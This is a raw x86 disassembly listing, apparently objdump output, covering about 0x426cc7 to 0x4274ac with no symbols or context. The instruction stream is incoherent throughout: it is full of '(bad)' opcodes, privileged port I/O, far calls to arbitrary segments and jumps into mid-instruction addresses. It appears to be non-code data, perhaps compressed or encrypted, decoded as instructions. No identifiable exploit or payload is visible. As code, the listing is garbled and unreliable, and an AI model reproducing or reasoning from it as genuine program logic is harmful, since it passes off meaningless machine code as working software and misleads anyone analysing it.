  426cc7:	cli    
  426cc8:	pop    ebx
  426cc9:	enter  0x4f9c,0xd0
  426ccd:	jo     0x426ca7
  426ccf:	lods   al,BYTE PTR ds:[esi]
  426cd0:	aad    0x78
  426cd2:	cmp    al,0x21
  426cd4:	cwde   
  426cd5:	push   ss
  426cd6:	mov    esp,0x824ab534
  426cdb:	adc    eax,0x35c11b50
  426ce0:	scas   eax,DWORD PTR es:[edi]
  426ce1:	pop    eax
  426ce2:	mov    ebp,0x99e15cb
  426ce7:	das    
  426ce8:	mov    ah,BYTE PTR [ebp-0x16]
  426ceb:	jnp    0x426d46
  426ced:	jle    0x426d24
  426cef:	in     eax,dx
  426cf0:	ds push ebx
  426cf2:	fdivr  DWORD PTR [ebp+0x200dfa16]
  426cf8:	cmp    al,0x49
  426cfa:	add    ebp,DWORD PTR [ebx]
  426cfc:	loop   0x426d5a
  426cfe:	cmp    eax,0x78029265
  426d03:	scas   al,BYTE PTR es:[edi]
  426d04:	jo     0x426cab
  426d06:	cmp    esi,DWORD PTR [edi]
  426d08:	sbb    eax,0x235f06cd
  426d0d:	inc    bl
  426d0f:	add    dl,al
  426d11:	fiadd  DWORD PTR ds:0x42bde334
  426d17:	jb     0x426d26
  426d19:	lahf   
  426d1a:	xor    edi,DWORD PTR [esi]
  426d1c:	mov    DWORD PTR [ecx-0x18],ebx
  426d1f:	ret    0x838c
  426d22:	cmp    DWORD PTR [esi+0x7d],esi
  426d25:	cdq    
  426d26:	mov    bh,BYTE PTR [edi+0x21962a3]
  426d2c:	mov    dh,0x56
  426d2e:	leave  
  426d2f:	ins    BYTE PTR es:[edi],dx
  426d30:	in     al,dx
  426d31:	jne    0x426d39
  426d33:	sbb    eax,DWORD PTR [ebp+0x48]
  426d36:	add    DWORD PTR [edi-0xb541b70],esi
  426d3c:	shl    dh,0xdf
  426d3f:	push   cs
  426d40:	inc    eax
  426d41:	push   edi
  426d42:	aad    0x62
  426d44:	cmp    BYTE PTR [ebp+0x5633bbfc],cl
  426d4a:	pushf  
  426d4b:	dec    esp
  426d4c:	ss (bad) 
  426d4e:	out    dx,al
  426d4f:	dec    DWORD PTR [ecx]
  426d51:	inc    edi
  426d52:	ror    BYTE PTR [esi+0x2a],0x6b
  426d56:	inc    ecx
  426d57:	cwde   
  426d58:	aas    
  426d59:	ss dec eax
  426d5b:	ss sub eax,edx
  426d5e:	mov    DWORD PTR [ebp+edx*4-0x64e050da],ebp
  426d65:	push   edx
  426d66:	xlat   BYTE PTR ds:[ebx]
  426d67:	and    eax,0x12e9da4c
  426d6c:	int    0x36
  426d6e:	push   ds
  426d6f:	or     DWORD PTR [eax+0x13],ebx
  426d72:	ins    DWORD PTR es:[edi],dx
  426d73:	xchg   BYTE PTR [esi+0x3927351],dl
  426d79:	loope  0x426d04
  426d7b:	test   BYTE PTR fs:[ebx],dh
  426d7e:	cs in  al,0x4f
  426d81:	(bad)  
  426d82:	or     eax,0xef8c6a1e
  426d87:	xchg   edx,eax
  426d88:	cmp    BYTE PTR [edi-0x78],dh
  426d8b:	xor    BYTE PTR [edi*4+0x8d1bbb3],ah
  426d92:	dec    esi
  426d93:	mov    edx,0x489e945c
  426d98:	fild   WORD PTR [edi]
  426d9a:	daa    
  426d9b:	test   BYTE PTR [esi-0x71],0xa7
  426d9f:	lock jb 0x426dad
  426da2:	push   esp
  426da3:	stos   BYTE PTR es:[edi],al
  426da4:	in     al,dx
  426da5:	fdivr  QWORD PTR [edi+0xd]
  426da8:	shr    DWORD PTR [edi],0xbc
  426dab:	ins    DWORD PTR es:[edi],dx
  426dac:	ds js  0x426d65
  426daf:	xchg   bl,cl
  426db1:	mov    dh,0xea
  426db3:	int    0x41
  426db5:	sar    BYTE PTR [ecx-0x3cb30375],1
  426dbb:	in     al,0xb9
  426dbd:	test   al,0x2d
  426dbf:	jne    0x426d43
  426dc1:	xchg   edi,eax
  426dc2:	gs add dh,ch
  426dc5:	mov    esi,0xb5f61469
  426dca:	cdq    
  426dcb:	mov    esp,0xd4a3a20c
  426dd0:	mov    bh,0xce
  426dd2:	arpl   dx,sp
  426dd4:	inc    edi
  426dd5:	popa   
  426dd6:	outs   dx,DWORD PTR ds:[esi]
  426dd7:	add    BYTE PTR [ecx+0x64cb07ac],dh
  426ddd:	fs pop es
  426ddf:	pop    eax
  426de0:	outs   dx,BYTE PTR ds:[esi]
  426de1:	ss jne 0x426e53
  426de4:	mov    ?,WORD PTR [edx]
  426de6:	mov    edi,fs
  426de8:	mov    ebx,0x4f0be174
  426ded:	sbb    eax,0xf936e9d3
  426df2:	(bad)  
  426df3:	mov    ah,0x48
  426df5:	jns    0x426dd3
  426df7:	pop    edx
  426df8:	mov    eax,ds:0xd5e7d34f
  426dfd:	xlat   BYTE PTR ds:[ebx]
  426dfe:	and    al,0x95
  426e00:	fdiv   DWORD PTR [ecx]
  426e02:	mov    ds:0xf10238bb,al
  426e07:	inc    ebx
  426e08:	test   esp,edi
  426e0a:	cmp    al,0xa0
  426e0c:	fisubr DWORD PTR [esi]
  426e0e:	pop    ss
  426e0f:	inc    esi
	...
  426e18:	add    BYTE PTR [eax],al
  426e1a:	mov    dh,0xe4
  426e1c:	xlat   BYTE PTR ds:[ebx]
  426e1d:	push   esp
  426e1e:	xlat   BYTE PTR ds:[ebx]
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	out    0x94,al
  426e28:	ret    0xa616
  426e2b:	in     al,0x1
  426e2d:	add    dh,bh
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR ds:0xf4072543,al
  426e37:	rcl    DWORD PTR [edx-0x38aa873e],0xba
  426e3e:	add    cl,bl
  426e40:	sbb    al,0x8
  426e42:	repz cmp eax,0x111c561
  426e48:	shl    DWORD PTR [eax-0x59],cl
  426e4b:	push   edi
  426e4c:	sub    DWORD PTR [esi-0x1415acac],0x39
  426e53:	pop    edi
  426e54:	xor    DWORD PTR [edx],edi
  426e56:	rcl    DWORD PTR [ecx-0x353270b7],cl
  426e5c:	inc    ebp
  426e5d:	mov    ch,0x99
  426e5f:	(bad)  
  426e60:	xchg   edi,eax
  426e61:	cld    
  426e62:	fist   DWORD PTR [ebp+0x3f]
  426e65:	inc    ebp
  426e66:	sbb    bl,BYTE PTR [ebx+0x63]
  426e69:	repz pusha 
  426e6b:	stc    
  426e6c:	sti    
  426e6d:	jnp    0x426e52
  426e6f:	add    ecx,eax
  426e71:	lds    esp,FWORD PTR [esi+edi*8]
  426e74:	hlt    
  426e75:	call   0xe33:0xa43b200e
  426e7c:	out    0xda,eax
  426e7e:	xchg   edi,eax
  426e7f:	xor    al,0x31
  426e81:	mov    dh,0x62
  426e83:	scas   al,BYTE PTR es:[edi]
  426e84:	outs   dx,BYTE PTR ds:[esi]
  426e85:	pop    ebx
  426e86:	mov    eax,0x2ab4f78f
  426e8b:	jmp    0x2fab:0x4947a950
  426e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e93:	mov    edx,0xcb389ce1
  426e98:	call   0x6d8e:0xe894cfcf
  426e9f:	and    al,0x46
  426ea1:	xor    eax,0x1531b943
  426ea6:	dec    ecx
  426ea7:	jno    0x426eaf
  426ea9:	push   cs
  426eaa:	push   ebx
  426eab:	dec    esp
  426eac:	inc    ebx
  426ead:	mov    ebx,0x4c6d1f4f
  426eb2:	lods   al,BYTE PTR ds:[esi]
  426eb3:	loop   0x426ef2
  426eb5:	ret    0x7d5b
  426eb8:	pop    es
  426eb9:	mov    cl,0x82
  426ebb:	xor    eax,0xef45dc2b
  426ec0:	ja     0x426e9b
  426ec2:	jb     0x426f11
  426ec4:	(bad)  
  426ec5:	cld    
  426ec6:	adc    DWORD PTR [esp+edi*8+0x20ba35fe],edx
  426ecd:	jecxz  0x426e9a
  426ecf:	jmp    0x426eb8
  426ed1:	cmp    eax,0xfe6946a8
  426ed6:	ret    
  426ed7:	cli    
  426ed8:	scas   eax,DWORD PTR es:[edi]
  426ed9:	cld    
  426eda:	shr    BYTE PTR ds:0x734b70f1,0x36
  426ee1:	(bad)  
  426ee2:	push   edx
  426ee3:	adc    ah,BYTE PTR [edx]
  426ee5:	adc    eax,0x9792e111
  426eea:	jnp    0x426f22
  426eec:	add    edi,ebp
  426eee:	jns    0x426f4f
  426ef0:	jecxz  0x426f4c
  426ef2:	jecxz  0x426ed4
  426ef4:	out    dx,al
  426ef5:	or     al,0xae
  426ef7:	lahf   
  426ef8:	dec    edi
  426ef9:	jge    0x426f4b
  426efb:	mov    edi,0x2e37013a
  426f00:	repz and al,0x81
  426f03:	cmp    dh,BYTE PTR [eax-0x783b048a]
  426f09:	fs jo  0x426ee2
  426f0c:	ins    BYTE PTR es:[edi],dx
  426f0d:	pop    ds
  426f0e:	add    cl,BYTE PTR [ebx]
  426f10:	or     ah,BYTE PTR [ecx+0x77]
  426f13:	xchg   ebx,eax
  426f14:	add    al,0x57
  426f16:	mov    esi,0x6a4621c9
  426f1b:	dec    eax
  426f1c:	jns    0x426f94
  426f1e:	push   ebx
  426f1f:	out    0xd7,eax
  426f21:	cmp    BYTE PTR ds:0xd9464a15,0xa6
  426f28:	mul    DWORD PTR [esi+0xf60dad7]
  426f2e:	sahf   
  426f2f:	iret   
  426f30:	or     eax,0x35e5ff67
  426f35:	mov    edi,0xbb7c7e5
  426f3a:	in     al,0xe5
  426f3c:	jnp    0x426f0d
  426f3e:	js     0x426ee3
  426f40:	push   0xbb2e5f5a
  426f45:	ror    DWORD PTR [ecx+0x19821d2],1
  426f4b:	cld    
  426f4c:	bound  edx,QWORD PTR [ecx+0x59]
  426f4f:	mov    dl,0x56
  426f51:	sbb    eax,0xde683989
  426f56:	outs   dx,DWORD PTR ds:[esi]
  426f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f58:	iret   
  426f59:	ss or  eax,0xa0c7a348
  426f5f:	jl     0x426f9b
  426f61:	mov    ebp,0x6120703f
  426f66:	add    dl,BYTE PTR [ecx+ebp*1+0x21]
  426f6a:	sub    BYTE PTR [ebp-0x22e4bbac],bh
  426f70:	and    ebp,DWORD PTR gs:[esp+ebx*8-0x3c]
  426f75:	mov    ds:0x62b84de9,al
  426f7a:	jecxz  0x426f1b
  426f7c:	(bad)  
  426f7d:	fldcw  WORD PTR [edx-0x5757c3f4]
  426f83:	and    al,0xa3
  426f85:	int3   
  426f86:	cdq    
  426f87:	imul   ecx,DWORD PTR [ebp+esi*8-0x35],0xb12310b
  426f8f:	lock daa 
  426f91:	(bad)  
  426f93:	fsubr  QWORD PTR [esi+0x7d]
  426f96:	(bad)  
  426f97:	nop
  426f98:	cs pop ebp
  426f9a:	push   0xfd710978
  426f9f:	mov    eax,edx
  426fa1:	mov    ah,0xbb
  426fa3:	inc    edx
  426fa4:	adc    bh,BYTE PTR [esi]
  426fa6:	mov    DWORD PTR [edx+esi*1],ecx
  426fa9:	adc    dh,BYTE PTR [ebx-0x1fd052f0]
  426faf:	xchg   edx,eax
  426fb0:	push   es
  426fb1:	xchg   BYTE PTR [edx],bh
  426fb3:	mov    dh,0x93
  426fb5:	popf   
  426fb6:	repnz add DWORD PTR [ecx-0x7f3d93b4],ebx
  426fbd:	xchg   edi,eax
  426fbe:	js     0x426f40
  426fc0:	lods   eax,DWORD PTR ds:[esi]
  426fc1:	inc    esp
  426fc2:	pop    ecx
  426fc3:	inc    ebp
  426fc4:	jmp    0x426fff
  426fc6:	sbb    ecx,eax
  426fc8:	iret   
  426fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fca:	shl    DWORD PTR [ebx],0x6d
  426fcd:	pushf  
  426fce:	daa    
  426fcf:	cmc    
  426fd0:	sahf   
  426fd1:	jle    0x427015
  426fd3:	adc    cl,BYTE PTR [eax+ebx*1-0x29485a31]
  426fda:	cmp    eax,0xc3c0d611
  426fdf:	mov    dl,0x66
  426fe1:	push   ebp
  426fe2:	mov    cl,cl
  426fe4:	call   0x79b95c24
  426fe9:	xchg   ebx,eax
  426fea:	sbb    eax,0xe7a26ddc
  426fef:	mov    esi,0xc0c3d06a
  426ff4:	test   dh,dh
  426ff6:	or     al,0x64
  426ff8:	cwde   
  426ff9:	sahf   
  426ffa:	fwait
  426ffb:	or     BYTE PTR [ecx+0x1e],ah
  426ffe:	adc    DWORD PTR [eax+0x74f96396],eax
  427004:	pushf  
  427005:	(bad)
  427009:	scas   al,BYTE PTR es:[edi]
  42700a:	sbb    eax,0x371253d1
  42700f:	cmp    DWORD PTR [ebp-0x35],ecx
  427012:	imul   BYTE PTR [ebp+esi*2-0x17]
  427016:	test   al,0x5d
  427018:	cmc    
  427019:	(bad)  
  42701a:	test   DWORD PTR [ebx],ebp
  42701c:	into   
  42701d:	iret   
  42701e:	xchg   edx,eax
  42701f:	push   esp
  427020:	sahf   
  427021:	sub    eax,0x8f2287f0
  427026:	mov    dl,0x4c
  427028:	pmulhw mm3,QWORD PTR [eax]
  42702b:	and    al,0xb8
  42702d:	adc    eax,DWORD PTR [esi]
  42702f:	ja     0x427031
	...
  427039:	add    dl,bh
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx+0x3ca43d15]
  427047:	jmp    0x427063
  427049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42704a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42704b:	out    0x1,al
  42704d:	add    dh,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [eax-0x52],cl
  427054:	mov    ds:0x2ee79b35,al
  427059:	push   edx
  42705a:	dec    ecx
  42705b:	test   al,0x6
  42705d:	ret    
  42705e:	into   
  42705f:	and    ch,bh
  427061:	ret    0x5f51
  427064:	or     esi,eax
  427066:	sbb    eax,DWORD PTR [esi]
  427068:	pop    edi
  427069:	inc    ebp
  42706a:	jno    0x4270ce
  42706c:	scas   al,BYTE PTR es:[edi]
  42706d:	push   eax
  42706e:	icebp  
  42706f:	shl    DWORD PTR [eax+ebx*2-0xd1cf560],0x43
  427077:	cmp    DWORD PTR [ebx-0x6f],0xfffffff9
  42707b:	mov    ebx,0xfdaa0cf
  427080:	loope  0x427070
  427082:	mov    ds:0x47d41db4,eax
  427087:	imul   esi,DWORD PTR [esi],0xffffffe4
  42708a:	cld    
  42708b:	outs   dx,BYTE PTR ds:[esi]
  42708c:	ds sbb eax,0x1b1881e7
  427092:	data16 fist DWORD PTR [ecx+edi*1-0x39a6f0a6]
  42709a:	stos   BYTE PTR es:[edi],al
  42709b:	push   0x619c1179
  4270a0:	rcl    DWORD PTR fs:[esi+ecx*2-0x4a],1
  4270a5:	rcr    BYTE PTR [esp+ebx*4-0x26c6cea8],cl
  4270ac:	or     al,0x71
  4270ae:	pop    esi
  4270af:	test   al,0x6c
  4270b1:	add    BYTE PTR [esi],0xef
  4270b4:	ds shr edi,0x13
  4270b8:	push   0xffffff94
  4270ba:	pop    edi
  4270bb:	jge    0x4270e4
  4270bd:	aaa    
  4270be:	jne    0x42707c
  4270c0:	hlt    
  4270c1:	inc    edi
  4270c2:	ins    BYTE PTR es:[edi],dx
  4270c3:	inc    esp
  4270c4:	jo     0x4270b6
  4270c6:	popf   
  4270c7:	mov    ebp,0xad8716a2
  4270cc:	jge    0x427140
  4270ce:	pushf  
  4270cf:	xchg   edx,eax
  4270d0:	jle    0x427116
  4270d2:	dec    eax
  4270d3:	add    BYTE PTR [ebp+0x1465ddb],cl
  4270d9:	aad    0x78
  4270db:	test   DWORD PTR ds:[ecx],0x56cfecc9
  4270e2:	aas    
  4270e3:	xor    eax,0x6a37f09d
  4270e8:	pop    ds
  4270e9:	loope  0x42715a
  4270eb:	jne    0x4270d5
  4270ed:	add    BYTE PTR [eax],ch
  4270ef:	push   ebx
  4270f0:	pop    esi
  4270f1:	mov    edi,0xbfd8625
  4270f6:	jl     0x4270a7
  4270f8:	xor    eax,DWORD PTR [eax]
  4270fa:	inc    ebx
  4270fb:	ja     0x4270b9
  4270fd:	inc    ebx
  4270fe:	lock jne 0x4270c4
  427101:	cmp    dh,bl
  427103:	fisttp DWORD PTR [ebp-0x73cb03fc]
  427109:	cli    
  42710a:	inc    ebp
  42710b:	jge    0x4270b8
  42710d:	push   ss
  42710e:	xor    BYTE PTR [ebp-0x48],0x7c
  427112:	xchg   edx,eax
  427113:	call   0x7ccbc3d3
  427118:	call   0x3b750e6e
  42711d:	cmc    
  42711e:	(bad)  
  42711f:	mov    bh,0xb
  427121:	mov    ebp,esi
  427123:	jp     0x4270c5
  427125:	(bad)  
  427126:	cld    
  427127:	sbb    DWORD PTR [edi-0x55dc54c6],0xffffff9c
  42712e:	sbb    dl,BYTE PTR [esi]
  427130:	dec    edx
  427131:	ja     0x4270d6
  427133:	in     eax,dx
  427134:	xchg   edi,eax
  427135:	ins    DWORD PTR es:[edi],dx
  427136:	jae    0x427129
  427138:	stos   DWORD PTR es:[edi],eax
  427139:	cmp    BYTE PTR [edx],0xcc
  42713c:	lods   al,BYTE PTR ds:[esi]
  42713d:	sbb    BYTE PTR [ebp-0x6d9a9a29],ch
  427143:	inc    edx
  427144:	push   ss
  427145:	mov    cl,0xea
  427147:	ror    DWORD PTR [ecx],1
  427149:	jg     0x4271c6
  42714b:	xchg   BYTE PTR [ebx],ch
  42714d:	repnz cmp BYTE PTR [ebx],ah
  427150:	cmp    eax,0x36b2473a
  427155:	ret    0x87bb
  427158:	jns    0x4271cb
  42715a:	out    dx,al
  42715b:	jg     0x4271d5
  42715d:	shl    DWORD PTR [ebx+0x1c8f2252],cl
  427163:	sti    
  427164:	push   0xb6139670
  427169:	add    eax,0x4e08dc4
  42716e:	cmp    BYTE PTR [ecx+0xf46b168],bh
  427174:	and    ch,BYTE PTR [ebx+0x5344198f]
  42717a:	mov    DWORD PTR [ebp-0x49085bc5],esi
  427180:	ss push cs
  427182:	(bad)  
  427183:	cmc    
  427184:	push   eax
  427185:	stos   BYTE PTR es:[edi],al
  427186:	sub    al,0x66
  427188:	mov    dl,0x25
  42718a:	inc    ebx
  42718b:	mov    eax,ds:0x65734963
  427190:	sahf   
  427191:	call   0xd7d8:0x10bca4dc
  427198:	repz inc esi
  42719a:	shl    BYTE PTR [eax],1
  42719c:	nop    DWORD PTR [esi-0x4c6c9ba7]
  4271a3:	scas   eax,DWORD PTR es:[edi]
  4271a4:	mov    cl,0xec
  4271a6:	test   ch,0xdf
  4271a9:	inc    edi
  4271aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271ab:	out    0xbc,al
  4271ad:	dec    esp
  4271ae:	lods   al,BYTE PTR ds:[esi]
  4271af:	out    0x96,al
  4271b1:	sbb    eax,DWORD PTR [edi-0x6581971]
  4271b7:	sub    eax,edx
  4271b9:	mov    edi,0xf6bd65d
  4271be:	sti    
  4271bf:	int3   
  4271c0:	adc    DWORD PTR [esi+0x1b7f632b],ebx
  4271c6:	call   0xa14076fd
  4271cb:	imul   ebp,DWORD PTR [eax],0x810c0f75
  4271d1:	adc    DWORD PTR [eax],edx
  4271d3:	add    edi,DWORD PTR [ebp+0x49]
  4271d6:	mov    dh,0x5a
  4271d8:	push   eax
  4271d9:	push   ss
  4271da:	fidivr DWORD PTR [ecx-0x19]
  4271dd:	ret    0x300c
  4271e0:	std    
  4271e1:	fdivr  st(1),st
  4271e3:	and    eax,0x6abcaa31
  4271e8:	push   ebx
  4271e9:	loopne 0x42718b
  4271eb:	sub    BYTE PTR [ebx+0x19],dh
  4271ee:	sub    ebp,ebx
  4271f0:	jns    0x42718a
  4271f2:	dec    ebx
  4271f3:	retf   
  4271f4:	add    DWORD PTR ds:0x99c76f31,ebx
  4271fa:	xchg   edx,eax
  4271fb:	imul   edx,DWORD PTR [edi-0x21],0xef688f7d
  427202:	sbb    eax,DWORD PTR [edi-0x5678acf8]
  427208:	into   
  427209:	out    dx,eax
  42720a:	loop   0x4271e5
  42720c:	sbb    ebx,ecx
  42720e:	mov    edx,0x298d0522
  427213:	pop    ds
  427214:	in     al,dx
  427215:	aam    0x9
  427217:	mov    dl,0x31
  427219:	push   edx
  42721a:	inc    ebp
  42721b:	inc    edx
  42721c:	mov    ch,0xad
  42721e:	mov    eax,0xfb41acab
  427223:	adc    eax,0x5f957618
  427228:	rcr    ebx,cl
  42722a:	dec    edx
  42722b:	mov    ds:0x42bd3d90,al
  427230:	xlat   BYTE PTR ds:[ebx]
  427231:	rol    BYTE PTR [ecx+0x20],cl
  427234:	add    al,BYTE PTR [edi+eax*1]
  427237:	xchg   ebp,eax
  427238:	jp     0x4272b8
  42723a:	in     eax,dx
  42723b:	push   edi
  42723c:	xchg   ebx,eax
  42723d:	icebp  
  42723e:	imul   esi,DWORD PTR [eax-0x58d9dfe2],0x51a61a48
  427248:	lea    eax,[edi+0x6]
  42724b:	cdq    
  42724c:	imul   edi,DWORD PTR [ebp+0x9],0x7c
	...
  427258:	add    BYTE PTR [eax],al
  42725a:	iret   
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x1ab02077
  427267:	mov    esi,0xe8a205e6
  42726c:	add    DWORD PTR [eax],eax
  42726e:	inc    BYTE PTR [ecx]
  427270:	add    BYTE PTR [eax],al
  427272:	dec    ebx
  427273:	pop    esp
  427274:	adc    al,0x95
  427276:	xor    BYTE PTR cs:[edi+0x56],dh
  42727a:	jb     0x4272e5
  42727c:	test   BYTE PTR [edi+ecx*2-0x5358d9f],0xed
  427284:	cmc    
  427285:	or     dh,BYTE PTR [edx]
  427287:	ds cdq 
  427289:	pop    ss
  42728a:	inc    ebp
  42728b:	sar    BYTE PTR [edx-0x51],0xfa
  42728f:	mov    esp,0x4f1b5cd7
  427294:	stc    
  427295:	lds    edx,FWORD PTR [ecx]
  427297:	mov    ebx,0x2c2c5a9b
  42729c:	xchg   ebx,eax
  42729d:	(bad)  
  42729e:	(bad)  
  4272a0:	xor    ch,ah
  4272a2:	xchg   esp,eax
  4272a3:	rcr    esp,1
  4272a5:	scas   al,BYTE PTR es:[edi]
  4272a6:	xchg   ecx,eax
  4272a7:	and    al,0x67
  4272a9:	add    BYTE PTR [esi],dh
  4272ab:	sbb    eax,0xd5048d5b
  4272b0:	fisubr WORD PTR [edx]
  4272b2:	jne    0x427237
  4272b4:	cwde   
  4272b5:	loopne 0x4272a0
  4272b7:	mov    edi,0x47fb4832
  4272bc:	ror    DWORD PTR [ebx-0x6d],0xcc
  4272c0:	gs dec eax
  4272c2:	dec    ebx
  4272c3:	nop
  4272c4:	xor    al,0x8
  4272c6:	xchg   edi,eax
  4272c7:	pop    ds
  4272c8:	xchg   ecx,eax
  4272c9:	lds    edi,FWORD PTR [ebx+0x4c7c1475]
  4272cf:	icebp  
  4272d0:	mov    bl,0x37
  4272d2:	test   dh,ch
  4272d4:	cdq    
  4272d5:	je     0x42733c
  4272d7:	mov    dh,0x6f
  4272d9:	dec    esi
  4272da:	imul   eax,ecx,0xbe7e5781
  4272e0:	sbb    edx,DWORD PTR es:[edx+0x5846df92]
  4272e7:	ror    dh,cl
  4272e9:	adc    DWORD PTR [ebp-0xe],edi
  4272ec:	jle    0x42734c
  4272ee:	jp     0x427293
  4272f0:	leave  
  4272f1:	sub    dh,ch
  4272f3:	ror    DWORD PTR [esp+esi*1],0xac
  4272f7:	xchg   BYTE PTR [edi-0x5a4878e4],al
  4272fd:	stos   DWORD PTR es:[edi],eax
  4272fe:	xchg   esi,eax
  4272ff:	imul   edx,DWORD PTR [ecx+esi*4+0x50],0x7594455e
  427307:	or     BYTE PTR [edi],dh
  427309:	outs   dx,DWORD PTR ds:[esi]
  42730a:	jl     0x427361
  42730c:	push   edx
  42730d:	jne    0x427294
  42730f:	mov    bl,0xbd
  427311:	lds    edx,FWORD PTR [ecx+ebx*1]
  427314:	(bad)  
  427315:	jle    0x427384
  427317:	add    eax,0xa79d9cf6
  42731c:	icebp  
  42731d:	sub    DWORD PTR [ebp-0x608eeb37],edx
  427323:	push   ebp
  427324:	test   eax,0xda1ddeb6
  427329:	das    
  42732a:	lock in al,0xf9
  42732d:	into   
  42732e:	aad    0xd8
  427330:	mov    bl,0xe4
  427332:	repz inc ecx
  427334:	rol    BYTE PTR [ecx-0x60],1
  427337:	mov    eax,esp
  427339:	(bad)  
  42733a:	nop
  42733b:	jle    0x4272de
  42733d:	sbb    BYTE PTR [esi],0x4d
  427340:	jns    0x4272f8
  427342:	lahf   
  427343:	xchg   edi,eax
  427344:	cmc    
  427345:	shr    BYTE PTR [ecx],cl
  427347:	dec    esp
  427348:	push   cs
  427349:	add    dh,BYTE PTR [ebp+0x65c1d2dc]
  42734f:	lods   al,BYTE PTR ds:[esi]
  427350:	dec    ecx
  427351:	fucom  st(2)
  427353:	push   cs
  427354:	jns    0x427395
  427356:	xchg   BYTE PTR ds:0x85eae0a4,ah
  42735c:	add    dl,BYTE PTR [edx+0x6a]
  42735f:	jmp    0x82842698
  427364:	push   edx
  427365:	fwait
  427366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427367:	std    
  427368:	mov    cl,0xb7
  42736a:	pop    ecx
  42736b:	inc    esi
  42736c:	bound  eax,QWORD PTR [ebp-0x62]
  42736f:	rcr    BYTE PTR [ecx+0x591b90ed],1
  427375:	sbb    ah,BYTE PTR [ecx]
  427377:	inc    ecx
  427378:	inc    esp
  427379:	mov    ebp,0x2927248d
  42737e:	xchg   DWORD PTR [eax],ebp
  427380:	lds    eax,FWORD PTR [eax]
  427382:	xchg   BYTE PTR [edi+edi*4+0x668deba1],bl
  427389:	mov    dl,0x8b
  42738b:	(bad)  
  42738c:	(bad)
  427390:	popa   
  427391:	mov    al,ds:0xf0099ce3
  427396:	mov    ebx,0xeb676ae7
  42739b:	jbe    0x427401
  42739d:	dec    esp
  42739e:	popf   
  42739f:	dec    ecx
  4273a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273a1:	dec    ecx
  4273a2:	fcom   QWORD PTR [ecx+0x76749bb3]
  4273a8:	pop    ecx
  4273a9:	jecxz  0x427400
  4273ab:	sbb    BYTE PTR [ebx+0x41],dl
  4273ae:	mov    dl,0x88
  4273b0:	push   esi
  4273b1:	sar    al,0x70
  4273b4:	cmp    ebp,DWORD PTR [ebx-0x1]
  4273b7:	sub    al,0xd1
  4273b9:	in     al,0x50
  4273bb:	ins    BYTE PTR es:[edi],dx
  4273bc:	ins    DWORD PTR es:[edi],dx
  4273bd:	pusha  
  4273be:	xchg   ebp,eax
  4273bf:	mov    DWORD PTR [ecx],eax
  4273c1:	mov    bl,0x82
  4273c3:	inc    ebp
  4273c4:	in     eax,dx
  4273c5:	out    dx,al
  4273c6:	fs dec ebp
  4273c8:	rcl    BYTE PTR [eax+0x5c904f5c],cl
  4273ce:	ja     0x4273cb
  4273d0:	int    0x13
  4273d2:	shl    BYTE PTR [ebx+0x65],0xe3
  4273d6:	div    DWORD PTR [esi+0x70ff480]
  4273dc:	jns    0x4273d9
  4273de:	fld    QWORD PTR [ebx+0x79]
  4273e1:	std    
  4273e2:	hlt    
  4273e3:	ud0    edx,DWORD PTR [ebp+edx*1+0x76ffad12]
  4273eb:	add    edi,DWORD PTR [ecx]
  4273ed:	fld    TBYTE PTR ds:0xac90174b
  4273f3:	push   ss
  4273f4:	and    eax,0xb7b28188
  4273f9:	jno    0x427455
  4273fb:	gs inc ecx
  4273fd:	aaa    
  4273fe:	mov    al,ds:0x4c09348a
  427403:	mov    ecx,ds
  427405:	pop    edi
  427406:	mov    ds,WORD PTR [edx+0x12]
  427409:	loop   0x42745f
  42740b:	cmp    ah,dh
  42740d:	call   0x7795:0xac330d93
  427414:	inc    esi
  427415:	frstor [edx+0x0]
  427419:	out    0x82,al
  42741b:	mov    edi,0x9d12f076
  427420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427421:	jge    0x427462
  427423:	popa   
  427424:	or     eax,0x15843d82
  427429:	or     dl,ch
  42742b:	les    esi,FWORD PTR [ebx]
  42742d:	xor    BYTE PTR [esi-0x6091f364],dl
  427433:	aam    0xcf
  427435:	cmp    bh,BYTE PTR [ebx]
  427437:	push   ebx
  427438:	es stc 
  42743a:	dec    esi
  42743b:	jecxz  0x4273e1
  42743d:	fcmovu st,st(2)
  427440:	or     bh,al
  427442:	in     al,dx
  427443:	cmp    eax,DWORD PTR [edi+0xd]
  427446:	mul    BYTE PTR [esp+eiz*8]
  427449:	sub    BYTE PTR [ebp-0x16],ch
  42744c:	fst    DWORD PTR [eax]
  42744e:	pop    edi
  42744f:	arpl   sp,sp
  427451:	xor    BYTE PTR [edi+ebx*8+0x53adc26a],0xc5
  427459:	push   esi
  42745a:	sub    BYTE PTR [esi-0x75b578b9],bh
  427460:	mov    edi,0xe53fc078
  427465:	sar    BYTE PTR [edi-0x7a],0xa6
  427469:	mov    BYTE PTR [edx+esi*4+0x121ad7dc],bh
	...
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	sahf   
  427487:	ret    0x1e47
  42748a:	mov    al,ds:0xfe0001ea
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    bh,bl
  427493:	sub    eax,0x9416c5b
  427498:	adc    eax,0xcfa5f921
  42749d:	out    0xae,al
  42749f:	into   
  4274a0:	pop    edi
  4274a1:	push   ecx
  4274a2:	sbb    cl,dh
  4274a4:	jbe    0x4274b5
  4274a6:	push   edi
  4274a7:	jns    0x427479
  4274a9:	mov    dh,0x2d
  4274ab:	das    
  4274ac:	and    al,0x51
